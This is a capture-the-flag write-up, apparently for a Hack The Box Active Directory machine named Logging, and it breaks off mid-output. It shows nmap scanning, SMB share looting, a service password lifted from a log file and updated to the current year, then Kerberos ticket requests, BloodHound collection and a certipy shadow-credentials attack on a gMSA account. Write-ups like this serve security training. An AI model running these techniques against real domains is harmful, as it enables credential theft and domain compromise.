As is common in real life pentests, you will start the Logging box with credentials for the following account wallace.everette / Welcome2026@

![[Pasted image 20260421050847.png]]

### Nmap
```
nmap -sV -sC -vv 10.129.36.182

--OUTPUT---
Nmap scan report for 10.129.36.182
Host is up, received echo-reply ttl 127 (0.020s latency).
Scanned at 2026-04-21 05:05:06 EDT for 56s
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-21 16:05:14Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Issuer: commonName=logging-DC01-CA/domainComponent=logging
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-17T03:20:01
| Not valid after:  2106-04-17T03:20:01
| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
| -----BEGIN CERTIFICATE-----
| MIIG+DCCBOCgAwIBAgITFAAAAAbxfU7yg+mj1AABAAAABjANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbG9nZ2lu
| ZzEYMBYGA1UEAxMPbG9nZ2luZy1EQzAxLUNBMCAXDTI2MDQxNzAzMjAwMVoYDzIx
| MDYwNDE3MDMyMDAxWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| s8+q+Qxi7vqUbuJP+8Kk7GA6jYOHCloGjRKpRuwAHWUgwPQGydcTfPKMf5qk3dlf
| AIeWOHZELA54pfHeb9WphmoWB5CfN5hZmuoyg7HGKbMLj1C9SAhphOQNk3t0h5Gw
| DqZTzwsdD0zZ4IPmwLmgdI3p9cQRT/nQff9lb2DHLGpRQUqxySWNkfTSyTgrvKnW
| eG9zRrra9ieb1qGhdlb+FDDtWkk5O+XUjpB+Bg+Mo7sZ+zvz1POQrGwvXBqzo/aH
| 7G736fCIyy3q4S9pOHesDg8F0ndhXByOjlLIfLxif3e6gUPvQshbfl8G7mZLzmOi
| +HNwEkSrN7BjLrCY/UAY1QIDAQABo4IDHzCCAxswOAYJKwYBBAGCNxUHBCswKQYh
| KwYBBAGCNxUIhfKBf4WHj1+G3YcYgteNDoPY5miBGgEhAgFuAgEAMDIGA1UdJQQr
| MCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNV
| HQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEF
| BQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFNyGmX8pxGUw
| Zqgr+Usro3JEmaU9MB8GA1UdIwQYMBaAFPCtlhRt/O3VvFm24rsz+cY5bgOVMIHN
| BgNVHR8EgcUwgcIwgb+ggbyggbmGgbZsZGFwOi8vL0NOPWxvZ2dpbmctREMwMS1D
| QSgxKSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWxvZ2dpbmcsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1sb2dnaW5nLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bG9n
| Z2luZyxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwNAYDVR0RAQH/BCowKIIQREMwMS5sb2dnaW5nLmh0
| YoILbG9nZ2luZy5odGKCB2xvZ2dpbmcwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwMjA4MjM4MTUtMjc5NjUyOTQ4OS0xNjgyMTcw
| NTUyLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAHPP5F+HZKxz1O5/3bSdU3Hw8Uze
| ccX4W/fU1jU4PIpHaFE6mwCa3nbKuo4CHQjKRW4+Kn3kMbZvzOVNJ15gLDywGQ6R
| yL79AobPIlhE5bcIlfUcjj366fLnUiBy+i9BnlduKrnq7D7GCYXUlWn9WWvRFIkZ
| mCXSERigasPxE4MTbX7EdTi69CNtQD+OoqyMYSzi8XcgTjFcahqRHD0nYKU4oXSC
| c4njFNpRbCKSNC2I969+fJ8c15T4pJeIEJks7W7tHoub2EgDSwLY3a9vdpjn4tNB
| WFDTKvUswQ7pH1oTs7KC3viPDUYgHEisC5+ZFq2K3ZIur1TVGtepu048Ni7IcOyM
| wu81EbY2O7phQ0pA0lcSydx95yAMb60iZOe+WCBt8TdJHlKKhfBHyGzTku/fGJoF
| P0ASpCuV+izqJ0cOLhAJ2d4EQ5C6ILrYBzWUWwTIaJWh7yWbmGvOMZsuX+3HmKPp
| S2HmirJTu/QMBPa4y4NFa1EVwCFxtbEMxPjszf727/62g44GXvfRx4xioSosZr57
| 6mY+TIKQ4/URZy5GERi2CnsaHPqM2pyo8EtG0jCyErhe8VMZ3F2Oc4hp9CQH5urn
| jwFsp3hvJtrzQHCHnHVWQ0ouGIi5n8v6nEWTbyqoMYnQxjgqB2QTS8Nc1cBs38qH
| xmZv2ZLKHnzHY9YT
|_-----END CERTIFICATE-----
|_ssl-date: 2026-04-21T16:06:03+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-21T16:06:03+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Issuer: commonName=logging-DC01-CA/domainComponent=logging
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-17T03:20:01
| Not valid after:  2106-04-17T03:20:01
| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
| -----BEGIN CERTIFICATE-----
| MIIG+DCCBOCgAwIBAgITFAAAAAbxfU7yg+mj1AABAAAABjANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbG9nZ2lu
| ZzEYMBYGA1UEAxMPbG9nZ2luZy1EQzAxLUNBMCAXDTI2MDQxNzAzMjAwMVoYDzIx
| MDYwNDE3MDMyMDAxWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| s8+q+Qxi7vqUbuJP+8Kk7GA6jYOHCloGjRKpRuwAHWUgwPQGydcTfPKMf5qk3dlf
| AIeWOHZELA54pfHeb9WphmoWB5CfN5hZmuoyg7HGKbMLj1C9SAhphOQNk3t0h5Gw
| DqZTzwsdD0zZ4IPmwLmgdI3p9cQRT/nQff9lb2DHLGpRQUqxySWNkfTSyTgrvKnW
| eG9zRrra9ieb1qGhdlb+FDDtWkk5O+XUjpB+Bg+Mo7sZ+zvz1POQrGwvXBqzo/aH
| 7G736fCIyy3q4S9pOHesDg8F0ndhXByOjlLIfLxif3e6gUPvQshbfl8G7mZLzmOi
| +HNwEkSrN7BjLrCY/UAY1QIDAQABo4IDHzCCAxswOAYJKwYBBAGCNxUHBCswKQYh
| KwYBBAGCNxUIhfKBf4WHj1+G3YcYgteNDoPY5miBGgEhAgFuAgEAMDIGA1UdJQQr
| MCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNV
| HQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEF
| BQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFNyGmX8pxGUw
| Zqgr+Usro3JEmaU9MB8GA1UdIwQYMBaAFPCtlhRt/O3VvFm24rsz+cY5bgOVMIHN
| BgNVHR8EgcUwgcIwgb+ggbyggbmGgbZsZGFwOi8vL0NOPWxvZ2dpbmctREMwMS1D
| QSgxKSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWxvZ2dpbmcsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1sb2dnaW5nLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bG9n
| Z2luZyxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwNAYDVR0RAQH/BCowKIIQREMwMS5sb2dnaW5nLmh0
| YoILbG9nZ2luZy5odGKCB2xvZ2dpbmcwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwMjA4MjM4MTUtMjc5NjUyOTQ4OS0xNjgyMTcw
| NTUyLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAHPP5F+HZKxz1O5/3bSdU3Hw8Uze
| ccX4W/fU1jU4PIpHaFE6mwCa3nbKuo4CHQjKRW4+Kn3kMbZvzOVNJ15gLDywGQ6R
| yL79AobPIlhE5bcIlfUcjj366fLnUiBy+i9BnlduKrnq7D7GCYXUlWn9WWvRFIkZ
| mCXSERigasPxE4MTbX7EdTi69CNtQD+OoqyMYSzi8XcgTjFcahqRHD0nYKU4oXSC
| c4njFNpRbCKSNC2I969+fJ8c15T4pJeIEJks7W7tHoub2EgDSwLY3a9vdpjn4tNB
| WFDTKvUswQ7pH1oTs7KC3viPDUYgHEisC5+ZFq2K3ZIur1TVGtepu048Ni7IcOyM
| wu81EbY2O7phQ0pA0lcSydx95yAMb60iZOe+WCBt8TdJHlKKhfBHyGzTku/fGJoF
| P0ASpCuV+izqJ0cOLhAJ2d4EQ5C6ILrYBzWUWwTIaJWh7yWbmGvOMZsuX+3HmKPp
| S2HmirJTu/QMBPa4y4NFa1EVwCFxtbEMxPjszf727/62g44GXvfRx4xioSosZr57
| 6mY+TIKQ4/URZy5GERi2CnsaHPqM2pyo8EtG0jCyErhe8VMZ3F2Oc4hp9CQH5urn
| jwFsp3hvJtrzQHCHnHVWQ0ouGIi5n8v6nEWTbyqoMYnQxjgqB2QTS8Nc1cBs38qH
| xmZv2ZLKHnzHY9YT
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-21T16:06:03+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Issuer: commonName=logging-DC01-CA/domainComponent=logging
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-17T03:20:01
| Not valid after:  2106-04-17T03:20:01
| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
| -----BEGIN CERTIFICATE-----
| MIIG+DCCBOCgAwIBAgITFAAAAAbxfU7yg+mj1AABAAAABjANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbG9nZ2lu
| ZzEYMBYGA1UEAxMPbG9nZ2luZy1EQzAxLUNBMCAXDTI2MDQxNzAzMjAwMVoYDzIx
| MDYwNDE3MDMyMDAxWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| s8+q+Qxi7vqUbuJP+8Kk7GA6jYOHCloGjRKpRuwAHWUgwPQGydcTfPKMf5qk3dlf
| AIeWOHZELA54pfHeb9WphmoWB5CfN5hZmuoyg7HGKbMLj1C9SAhphOQNk3t0h5Gw
| DqZTzwsdD0zZ4IPmwLmgdI3p9cQRT/nQff9lb2DHLGpRQUqxySWNkfTSyTgrvKnW
| eG9zRrra9ieb1qGhdlb+FDDtWkk5O+XUjpB+Bg+Mo7sZ+zvz1POQrGwvXBqzo/aH
| 7G736fCIyy3q4S9pOHesDg8F0ndhXByOjlLIfLxif3e6gUPvQshbfl8G7mZLzmOi
| +HNwEkSrN7BjLrCY/UAY1QIDAQABo4IDHzCCAxswOAYJKwYBBAGCNxUHBCswKQYh
| KwYBBAGCNxUIhfKBf4WHj1+G3YcYgteNDoPY5miBGgEhAgFuAgEAMDIGA1UdJQQr
| MCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNV
| HQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEF
| BQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFNyGmX8pxGUw
| Zqgr+Usro3JEmaU9MB8GA1UdIwQYMBaAFPCtlhRt/O3VvFm24rsz+cY5bgOVMIHN
| BgNVHR8EgcUwgcIwgb+ggbyggbmGgbZsZGFwOi8vL0NOPWxvZ2dpbmctREMwMS1D
| QSgxKSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWxvZ2dpbmcsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1sb2dnaW5nLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bG9n
| Z2luZyxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwNAYDVR0RAQH/BCowKIIQREMwMS5sb2dnaW5nLmh0
| YoILbG9nZ2luZy5odGKCB2xvZ2dpbmcwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwMjA4MjM4MTUtMjc5NjUyOTQ4OS0xNjgyMTcw
| NTUyLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAHPP5F+HZKxz1O5/3bSdU3Hw8Uze
| ccX4W/fU1jU4PIpHaFE6mwCa3nbKuo4CHQjKRW4+Kn3kMbZvzOVNJ15gLDywGQ6R
| yL79AobPIlhE5bcIlfUcjj366fLnUiBy+i9BnlduKrnq7D7GCYXUlWn9WWvRFIkZ
| mCXSERigasPxE4MTbX7EdTi69CNtQD+OoqyMYSzi8XcgTjFcahqRHD0nYKU4oXSC
| c4njFNpRbCKSNC2I969+fJ8c15T4pJeIEJks7W7tHoub2EgDSwLY3a9vdpjn4tNB
| WFDTKvUswQ7pH1oTs7KC3viPDUYgHEisC5+ZFq2K3ZIur1TVGtepu048Ni7IcOyM
| wu81EbY2O7phQ0pA0lcSydx95yAMb60iZOe+WCBt8TdJHlKKhfBHyGzTku/fGJoF
| P0ASpCuV+izqJ0cOLhAJ2d4EQ5C6ILrYBzWUWwTIaJWh7yWbmGvOMZsuX+3HmKPp
| S2HmirJTu/QMBPa4y4NFa1EVwCFxtbEMxPjszf727/62g44GXvfRx4xioSosZr57
| 6mY+TIKQ4/URZy5GERi2CnsaHPqM2pyo8EtG0jCyErhe8VMZ3F2Oc4hp9CQH5urn
| jwFsp3hvJtrzQHCHnHVWQ0ouGIi5n8v6nEWTbyqoMYnQxjgqB2QTS8Nc1cBs38qH
| xmZv2ZLKHnzHY9YT
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-21T16:06:03+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Issuer: commonName=logging-DC01-CA/domainComponent=logging
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-17T03:20:01
| Not valid after:  2106-04-17T03:20:01
| MD5:     8572 96de c6fa 1e08 d694 2448 68cf d20b
| SHA-1:   8747 4415 e328 0940 a741 bace 327f a157 98d8 76e7
| SHA-256: f7c9 1a1d afd7 0b23 d3eb 802c bad8 aabf 6ad8 0a7b 1b56 3b26 3aea c6ed 4d1b 8b93
| -----BEGIN CERTIFICATE-----
| MIIG+DCCBOCgAwIBAgITFAAAAAbxfU7yg+mj1AABAAAABjANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbG9nZ2lu
| ZzEYMBYGA1UEAxMPbG9nZ2luZy1EQzAxLUNBMCAXDTI2MDQxNzAzMjAwMVoYDzIx
| MDYwNDE3MDMyMDAxWjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| s8+q+Qxi7vqUbuJP+8Kk7GA6jYOHCloGjRKpRuwAHWUgwPQGydcTfPKMf5qk3dlf
| AIeWOHZELA54pfHeb9WphmoWB5CfN5hZmuoyg7HGKbMLj1C9SAhphOQNk3t0h5Gw
| DqZTzwsdD0zZ4IPmwLmgdI3p9cQRT/nQff9lb2DHLGpRQUqxySWNkfTSyTgrvKnW
| eG9zRrra9ieb1qGhdlb+FDDtWkk5O+XUjpB+Bg+Mo7sZ+zvz1POQrGwvXBqzo/aH
| 7G736fCIyy3q4S9pOHesDg8F0ndhXByOjlLIfLxif3e6gUPvQshbfl8G7mZLzmOi
| +HNwEkSrN7BjLrCY/UAY1QIDAQABo4IDHzCCAxswOAYJKwYBBAGCNxUHBCswKQYh
| KwYBBAGCNxUIhfKBf4WHj1+G3YcYgteNDoPY5miBGgEhAgFuAgEAMDIGA1UdJQQr
| MCkGCCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNV
| HQ8BAf8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEF
| BQcDATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFNyGmX8pxGUw
| Zqgr+Usro3JEmaU9MB8GA1UdIwQYMBaAFPCtlhRt/O3VvFm24rsz+cY5bgOVMIHN
| BgNVHR8EgcUwgcIwgb+ggbyggbmGgbZsZGFwOi8vL0NOPWxvZ2dpbmctREMwMS1D
| QSgxKSxDTj1EQzAxLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxD
| Tj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWxvZ2dpbmcsREM9aHRiP2Nl
| cnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0
| cmlidXRpb25Qb2ludDCBwQYIKwYBBQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGh
| bGRhcDovLy9DTj1sb2dnaW5nLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bG9n
| Z2luZyxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
| ZmljYXRpb25BdXRob3JpdHkwNAYDVR0RAQH/BCowKIIQREMwMS5sb2dnaW5nLmh0
| YoILbG9nZ2luZy5odGKCB2xvZ2dpbmcwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwMjA4MjM4MTUtMjc5NjUyOTQ4OS0xNjgyMTcw
| NTUyLTEwMDAwDQYJKoZIhvcNAQELBQADggIBAHPP5F+HZKxz1O5/3bSdU3Hw8Uze
| ccX4W/fU1jU4PIpHaFE6mwCa3nbKuo4CHQjKRW4+Kn3kMbZvzOVNJ15gLDywGQ6R
| yL79AobPIlhE5bcIlfUcjj366fLnUiBy+i9BnlduKrnq7D7GCYXUlWn9WWvRFIkZ
| mCXSERigasPxE4MTbX7EdTi69CNtQD+OoqyMYSzi8XcgTjFcahqRHD0nYKU4oXSC
| c4njFNpRbCKSNC2I969+fJ8c15T4pJeIEJks7W7tHoub2EgDSwLY3a9vdpjn4tNB
| WFDTKvUswQ7pH1oTs7KC3viPDUYgHEisC5+ZFq2K3ZIur1TVGtepu048Ni7IcOyM
| wu81EbY2O7phQ0pA0lcSydx95yAMb60iZOe+WCBt8TdJHlKKhfBHyGzTku/fGJoF
| P0ASpCuV+izqJ0cOLhAJ2d4EQ5C6ILrYBzWUWwTIaJWh7yWbmGvOMZsuX+3HmKPp
| S2HmirJTu/QMBPa4y4NFa1EVwCFxtbEMxPjszf727/62g44GXvfRx4xioSosZr57
| 6mY+TIKQ4/URZy5GERi2CnsaHPqM2pyo8EtG0jCyErhe8VMZ3F2Oc4hp9CQH5urn
| jwFsp3hvJtrzQHCHnHVWQ0ouGIi5n8v6nEWTbyqoMYnQxjgqB2QTS8Nc1cBs38qH
| xmZv2ZLKHnzHY9YT
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-21T16:05:55
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45969/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 56499/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58015/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21845/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
```
 
### Port 80
![[Pasted image 20260421051805.png]]

### SMB
- Checking SMB shares via nxc:
```
nxc smb logging.htb -u 'wallace.everette' -p 'Welcome2026@' --shares

---OUTPUT---
SMB         10.129.36.182   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.36.182   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         10.129.36.182   445    DC01             [*] Enumerated shares
SMB         10.129.36.182   445    DC01             Share           Permissions     Remark
SMB         10.129.36.182   445    DC01             -----           -----------     ------
SMB         10.129.36.182   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.36.182   445    DC01             C$                              Default share
SMB         10.129.36.182   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.36.182   445    DC01             Logs            READ            
SMB         10.129.36.182   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.36.182   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.36.182   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

![[Pasted image 20260421051909.png]]

- Accessing Logs share:
```
smbclient -U 'wallace.everette' //logging.htb/Logs --password='Welcome2026@'
```
- Get all log files:
```
ls
mget *
y
y
y
y

---OUTPUT-LS---
smb: \> ls
  .                                   D        0  Thu Apr 16 19:10:09 2026
  ..                                  D        0  Thu Apr 16 19:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 19:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 19:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 19:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 19:10:09 2026
```
![[Pasted image 20260421052158.png]]

- I read everything and Find some credentials in `IdentitySync_Trace_20260219.log`
```
cat IdentitySync_Trace_20260219.log / cat *

---RELEVANT-OUTPUT---
2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
```
![[Pasted image 20260421052426.png]]

- Credentials : `LOGGING\svc_recovery`:`Em3rg3ncyPa$$2025`
- I also see it uses LDAP to authenticate from the logs.
- Another interesting data in the log file points to an SMTP alert to `it-alerts@logging.htb`
- <<and also that Microsoft Windows Server 2019 is running
- it also talks of an sQL server `HR01.logging.htb`
- Checking SMB this account is restricted:
![[Pasted image 20260421052824.png]]

- After a few tests I can get a ticket for this user using getTGT:
- But first I had to ater the password to the current year `2026` as the `2025` one didnt work was an old one
```
faketime "+7hours" impacket-getTGT -dc-ip 10.129.36.182 'logging.htb'/'svc_recovery':'Em3rg3ncyPa$$2026'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_recovery.ccache
```
![[Pasted image 20260421055339.png]]

- Then with this ticket I can get some bloodhound files:
```
export KRB5CCNAME=svc_recovery.ccache
faketime "+7hours"  bloodhound-python -u svc_recovery -k -no-pass -d logging.htb -ns 10.129.36.182 -dc DC01.logging.htb --zip -c All

---OUTPUT_--
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: logging.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: DC01.logging.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.logging.htb
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.logging.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20260421125214_bloodhound.zip
```

![[Pasted image 20260421055446.png]]

- We see `svc_recovery` has GenericWrite permissions on MSA_Health$ (which is part of Remote Magement Users):
![[Pasted image 20260421060910.png]]

- MSA Hleath$ sounds like a gMSA account.
- I try gMSADumper but it fails initially. I need to be able to have read permissions:
```
faketime "+7hours" nxc ldap DC01.logging.htb -k --use-kcache --gmsa                                                         
LDAP        DC01.logging.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:LOGGING.HTB) (signing:None) (channel binding:Never) 
LDAP        DC01.logging.htb 389    DC01             [+] LOGGING.HTB\svc_recovery from ccache 
LDAP        DC01.logging.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        DC01.logging.htb 389    DC01             Account: msa_health$          NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: []
```

![[Pasted image 20260421065319.png]]

- Using certipy-ad I can get hash
```
faketime "+7hours" certipy-ad shadow auto \
  -u 'svc_recovery@logging.htb' -k -no-pass \
  -account 'msa_health$' \
  -dc-ip 10.129.36.182 \
  -target DC01.logging.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'msa_health$'
[*] Generating certificate
